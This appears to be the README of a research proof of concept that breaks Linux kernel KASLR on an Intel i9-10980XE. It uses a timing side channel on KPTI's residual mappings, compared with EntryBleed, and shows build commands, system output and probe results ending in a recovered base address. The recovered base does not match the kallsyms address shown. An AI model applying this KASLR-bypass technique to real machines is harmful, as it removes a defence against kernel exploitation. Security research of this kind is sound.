# TET-CC-KASLR for Intel i9-10980XE

As KPTI will still have the necessary page mapping residue, which will trigger the TLB Entry Load, which will interfere with TET's Channel.

Since it is only PoC, we use `EntryBleed` to obtain the residual mapping address, and then observe whether there are different characteristics under tet-cc, and the result is yes.

> Note that we observed this behavior only on Intel CPUs and within the virtual machine. In contrast, the AMD test machine acted differently and never created a TLB entry in the mentioned case. The double page fault method can thus not be applied on our AMD CPU.
> 
> R. Hund, C. Willems, and T. Holz, “Practical Timing Side Channel Attacks against Kernel Space ASLR,” in 2013 IEEE Symposium on Security and Privacy, Berkeley, CA: IEEE, May 2013, pp. 191–205. doi: 10.1109/SP.2013.23.

The same thing about `EntryBleed` is that we all use the residual mapping of KPTI, but `EntryBleed` use the side effect of the prefetch instruction, and we use the side effect of transient pipeline stall.

## Environment

```shell
$ uname -a
Linux XXX 5.15.0-72-generic #79-Ubuntu SMP XXX x86_64 x86_64 x86_64 GNU/Linux

$ lscpu   
Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  Address sizes:         46 bits physical, 48 bits virtual
  Byte Order:            Little Endian
CPU(s):                  36
  On-line CPU(s) list:   0-35
Vendor ID:               GenuineIntel
  Model name:            Intel(R) Core(TM) i9-10980XE CPU @ 3.00GHz
    CPU family:          6
    Model:               85
    Thread(s) per core:  2
    Core(s) per socket:  18
    Socket(s):           1
    Stepping:            7
    CPU max MHz:         4800.0000
    CPU min MHz:         1200.0000
    BogoMIPS:            6000.00
    Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_t
                         sc art arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm
                          pcid dca sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault cat_l3 cdp_l3 invpcid_single pti
                          ssbd mba ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi flexpriority ept vpid ept_ad fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid cqm mpx rdt_a avx512f
                          avx512dq rdseed adx smap clflushopt clwb intel_pt avx512cd avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves cqm_llc cqm_occup_llc cqm_mbm_total cqm_mbm_local 
                         dtherm ida arat pln pts hwp hwp_act_window hwp_pkg_req avx512_vnni md_clear flush_l1d arch_capabilities
Virtualization features: 
  Virtualization:        VT-x
Caches (sum of all):     
  L1d:                   576 KiB (18 instances)
  L1i:                   576 KiB (18 instances)
  L2:                    18 MiB (18 instances)
  L3:                    24.8 MiB (1 instance)
NUMA:                    
  NUMA node(s):          1
  NUMA node0 CPU(s):     0-35
Vulnerabilities:         
  Itlb multihit:         KVM: Mitigation: VMX disabled
  L1tf:                  Not affected
  Mds:                   Not affected
  Meltdown:              Not affected
  Mmio stale data:       Mitigation; Clear CPU buffers; SMT vulnerable
  Retbleed:              Mitigation; Enhanced IBRS
  Spec store bypass:     Mitigation; Speculative Store Bypass disabled via prctl and seccomp
  Spectre v1:            Mitigation; usercopy/swapgs barriers and __user pointer sanitization
  Spectre v2:            Mitigation; Enhanced IBRS, IBPB conditional, RSB filling, PBRSB-eIBRS SW sequence
  Srbds:                 Not affected
  Tsx async abort:       Mitigation; TSX disabled

$ sudo dmesg | grep 'page tables isolation'
[    0.008458] Kernel/User page tables isolation: force enabled on command line.
[    0.277231] Kernel/User page tables isolation: enabled
```

## Experiment Result
```shell
$ sudo cat /proc/kallsyms | grep startup_64
ffffffff81000000 T startup_64
ffffffff81000040 T secondary_startup_64
ffffffff81000045 T secondary_startup_64_no_verify
ffffffff810002f0 T __startup_64
ffffffff81000840 T startup_64_setup_env

$ mkdir build && cd build && cmake ..
...

$ cmake --build . && taskset -c 1 ./tet_cc_kaslr
...
invalid_addr: 0xffffffff80000000
size: 0,         max_i: 23,      max_i_index: S
size: 1,         max_i: 32,      max_i_index: S
size: 2,         max_i: 34,      max_i_index: S
size: 3,         max_i: 26,      max_i_index: S
size: 4,         max_i: 31,      max_i_index: S
success_count: 5
invalid_addr: 0xffffffff81000000
size: 0,         max_i: 38,      max_i_index: S
size: 1,         max_i: 26,      max_i_index: S
size: 2,         max_i: 28,      max_i_index: S
size: 3,         max_i: 19,      max_i_index: S
size: 4,         max_i: 51,      max_i_index: S
success_count: 5
invalid_addr: 0xffffffff81e00000
size: 0,         max_i: 5,       max_i_index: H
size: 1,         max_i: 5,       max_i_index: G
size: 2,         max_i: 7,       max_i_index: H
size: 3,         max_i: 7,       max_i_index: O
size: 4,         max_i: 5,       max_i_index: F
success_count: 0
invalid_addr: 0xffffffff81c00000
size: 0,         max_i: 19,      max_i_index: S
size: 1,         max_i: 22,      max_i_index: S
size: 2,         max_i: 14,      max_i_index: S
size: 3,         max_i: 16,      max_i_index: S
size: 4,         max_i: 29,      max_i_index: S
success_count: 5
invalid_addr: 0xffffffff82000000
size: 0,         max_i: 27,      max_i_index: S
size: 1,         max_i: 21,      max_i_index: S
size: 2,         max_i: 16,      max_i_index: S
size: 3,         max_i: 15,      max_i_index: S
size: 4,         max_i: 14,      max_i_index: S
success_count: 5
invalid_addr: 0xffffffff83000000
size: 0,         max_i: 16,      max_i_index: S
size: 1,         max_i: 11,      max_i_index: S
size: 2,         max_i: 15,      max_i_index: S
size: 3,         max_i: 10,      max_i_index: S
size: 4,         max_i: 13,      max_i_index: S
success_count: 5
KASLR base: 0xffffffff81e00000
```